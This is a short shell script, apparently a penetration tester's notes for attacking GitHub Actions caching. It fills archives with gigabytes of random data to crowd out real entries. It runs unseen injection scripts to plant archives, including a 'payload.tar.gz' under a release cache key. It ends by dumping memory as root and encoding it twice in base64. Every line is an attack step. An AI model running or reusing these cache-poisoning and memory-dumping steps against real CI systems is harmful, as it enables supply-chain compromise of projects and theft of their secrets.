#mkdir arc1
#dd bs=4M count=1024 if=/dev/urandom of='arc1/pentest_gomi1'
#dd bs=4M count=1024 if=/dev/urandom of='arc1/pentest_gomi2'
#dd bs=4M count=1024 if=/dev/urandom of='arc1/pentest_gomi3'
#tar -P --zstd -cf arc1.tar.gz ./arc1

#mkdir arc2
#mv arc1/pentest_gomi1 arc2/pentest_gomi4
#mv arc1/pentest_gomi2 arc2/pentest_gomi5
#mv arc1/pentest_gomi3 arc2/pentest_gomi6

#tar -P --zstd -cf arc2.tar.gz ./arc2


#node inj.js ./arc1.tar.gz arc1
#node inj.js ./arc2.tar.gz arc2
#node inj.js ./arc1.tar.gz arc3
#node inj.js ./arc2.tar.gz arc4

npm install @actions/cache@4 @actions/core
node inj2.mjs
#node inj.js ./payload.tar.gz release-cache-v1

#sudo python3 mem.py | base64 | base64